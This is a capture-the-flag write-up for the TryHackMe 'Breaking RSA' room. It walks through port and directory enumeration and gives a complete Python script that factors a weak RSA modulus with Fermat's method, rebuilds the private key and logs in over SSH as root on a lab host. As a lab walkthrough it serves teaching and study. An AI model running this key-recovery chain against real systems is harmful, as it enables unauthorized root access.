---
title: 'TryHackMe: Breaking RSA'
author: jaxafed
categories: [TryHackMe]
tags: [web, rsa, cryptography, python, ssh]
render_with_liquid: false
media_subpath: /images/tryhackme_breaking_rsa/
image:
  path: room_image.webp
---

Breaking RSA was a simple room about RSA, where we discover a public key on a web server along with a note stating the key is weak due to factors for modulus chosen to be numerically close. Using Fermat’s factorization method to factorize the modulus from the public key, we were able to calculate the private exponent and construct the private key. Using this private key with SSH, we were able to get a shell as root.

![Tryhackme Room Link](room_card.webp){: width="600" height="150" .shadow }
_<https://tryhackme.com/room/breakrsa>_

## Initial enumeration

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.38.43
Nmap scan report for 10.10.38.43
Host is up (0.079s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ff:8c:c9:bb:9c:6f:6e:12:92:c0:96:0f:b5:58:c6:f8 (RSA)
|   256 67:ff:d4:09:ee:2c:8d:eb:94:b3:af:17:8e:dc:94:ae (ECDSA)
|_  256 81:0e:b2:0e:f6:64:76:3c:c3:39:72:c1:29:59:c3:3c (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Jack Of All Trades
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two ports open:

- 22/SSH
- 80/HTTP

## Shell as root

### Enumerating the website

At `http://10.10.38.43/`, we get a static page with nothing helpful.

![Website Index Page](website_index_page.webp){: width="1000" height="400" }

Using `gobuster` to search for directories, we find the `/development/` directory.

```console
$ gobuster dir -u 'http://10.10.38.43/' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.38.43/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/development          (Status: 301) [Size: 178] [--> http://10.10.38.43/development/]
```

At `http://10.10.38.43/development/`, indexing is enabled, and there are two files.

![Website Development Page](website_development_page.webp){: width="1000" height="400" }

Downloading these files.

- `id_rsa.pub`

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDrZh8oe8Q8j6kt26IZ906kZ7XyJ3sFCVczs1Gqe8w7ZgU+XGL2vpSD100andPQMwDi3wMX98EvEUbTtcoM4p863C3h23iUOpmZ3Mw8z51b9DEXjPLunPnwAYxhIxdP7czKlfgUCe2n49QHuTqtGE/Gs+avjPcPrZc3VrGAuhFM4P+e4CCbd9NzMtBXrO5HoSV6PEw7NSR7sWDcAQ47cd287U8h9hIf9Paj6hXJ8oters0CkgfbuG99SVVykoVkMfiRXIpu+Ir8Fu1103Nt/cv5nJX5h/KpdQ8iXVopmQNFzNFJjU2De9lohLlUZpM81fP1cDwwGF3X52FzgZ7Y67Je56Rz/fc8JMhqqR+N5P5IyBcSJlfyCSGTfDf+DNiioRGcPFIwH+8cIv9XUe9QFKo9tVI8ElE6U80sXxUYvSg5CPcggKJy68DET2TSxO/AGczxBjSft/BHQ+vwcbGtEnWgvZqyZ49usMAfgz0t6qFp4g1hKFCutdMMvPoHb1xGw9b1FhbLEw6j9s7lMrobaRu5eRiAcIrJtv+5hqX6r6loOXpd0Ip1hH/Ykle2fFfiUfNWCcFfre2AIQ1px9pL0tg8x1NHd55edAdNY3mbk3I66nthA5a0FrKrnEgDXLVLJKPEUMwY8JhAOizdOCpb2swPwvpzO32OjjNus7tKSRe87w==
```
{: file="id_rsa.pub" .wrap}


- `log.txt`

```
The library we are using to generate SSH keys implements RSA poorly. The two
randomly selected prime numbers (p and q) are very close to one another. Such
bad keys can easily be broken with Fermat's factorization method.

Also, SSH root login is enabled.

<https://github.com/murtaza-u/zet/tree/main/20220808171808\>

--- 
```
{: file="log.txt" }

From the `log.txt`, we learn that the used RSA key is weak due to factors of modulus (*p* and *q*) being close to each other and SSH root login being enabled.

When factors are close, we can use [Fermat's factorization method](https://en.wikipedia.org/wiki/Fermat%27s_factorization_method) to easily factorize the modulus and use the found factors to calculate the private exponent (*d*).

### Generating the private RSA key

We can use the Python implementation of Fermat's factorization method given in the room to factorize the modulus (*n*).


```python
from gmpy2 import isqrt

def factorize(n):
    # since even nos. are always divisible by 2, one of the factors will
    # always be 2
    if (n & 1) == 0:
        return (n/2, 2)

    # isqrt returns the integer square root of n
    a = isqrt(n)

    # if n is a perfect square the factors will be ( sqrt(n), sqrt(n) )
    if a * a == n:
        return a, a

    while True:
        a = a + 1
        bsq = a * a - n
        b = isqrt(bsq)
        if b * b == bsq:
            break

    return a + b, a - b
```

Reading the public key and importing it using `PyCryptodome`.

```python
from Crypto.PublicKey import RSA
pub_key = RSA.importKey(open("id_rsa.pub", "rb").read())
```

After importing the key, we can get the key size in bits and the last ten digits of modulus (*n*) to answer the questions.

```python
print(f"[+] Length of RSA key in bits: {pub_key.size_in_bits()}")
print(f"[+] Last 10 digits of n: {str(pub_key.n)[-10:]}")
```

Finding the factors of modulus (*n*):

```python
p, q = factorize(pub_key.n)
```

Now, we can find the numerical difference between *p* and *q* to answer another question.

```python
print(f"[+] Numerical difference between p and q: {p-q}")
```

Using the found factors to calculate the private exponent (*d*).

```python
phi = (p-1)*(q-1)
d = pow(pub_key.e, -1, phi)
```

Using the private exponend (*d*), modulus (*n*) and public exponent (*e*) to create a private key.

```python
priv_key = RSA.construct((pub_key.n, pub_key.e, int(d)))
```

Exporting and writing the private key to a file.
```python
open("id_rsa", "wb").write(priv_key.export_key())
```

Complete Python script:

```python
#!/usr/bin/python3

from Crypto.PublicKey import RSA
from gmpy2 import isqrt

def factorize(n):
    # since even nos. are always divisible by 2, one of the factors will
    # always be 2
    if (n & 1) == 0:
        return (n/2, 2)

    # isqrt returns the integer square root of n
    a = isqrt(n)

    # if n is a perfect square the factors will be ( sqrt(n), sqrt(n) )
    if a * a == n:
        return a, a

    while True:
        a = a + 1
        bsq = a * a - n
        b = isqrt(bsq)
        if b * b == bsq:
            break

    return a + b, a - b


pub_key = RSA.importKey(open("id_rsa.pub", "rb").read())
print(f"[+] Length of RSA key in bits: {pub_key.size_in_bits()}")
print(f"[+] Last 10 digits of n: {str(pub_key.n)[-10:]}")
p, q = factorize(pub_key.n)
print(f"[+] Numerical difference between p and q: {p-q}")
phi = (p-1)*(q-1)
d = pow(pub_key.e, -1, phi)
priv_key = RSA.construct((pub_key.n, pub_key.e, int(d)))
print(f"[+] Writing private key to id_rsa")
open("id_rsa", "wb").write(priv_key.export_key())
```
{: file="solve.py"}

Running it, we get all the answers to questions and the private key.

```console
$ python3 solve.py
[+] Length of RSA key in bits: [REDACTED]
[+] Last 10 digits of n: [REDACTED]
[+] Numerical difference between p and q: [REDACTED]
[+] Writing private key to id_rsa
```

### Getting shell as root via SSH

After setting the correct permissions for the private key, we are able to use it with SSH to get a shell as `root` and read the flag.

```console
$ chmod 600 id_rsa
```
```console
$ ssh -i id_rsa root@10.10.38.43
...
root@thm:~# wc -c flag 
36 flag
```

<style>
.wrap pre{
  white-space: pre-wrap;
}
</style>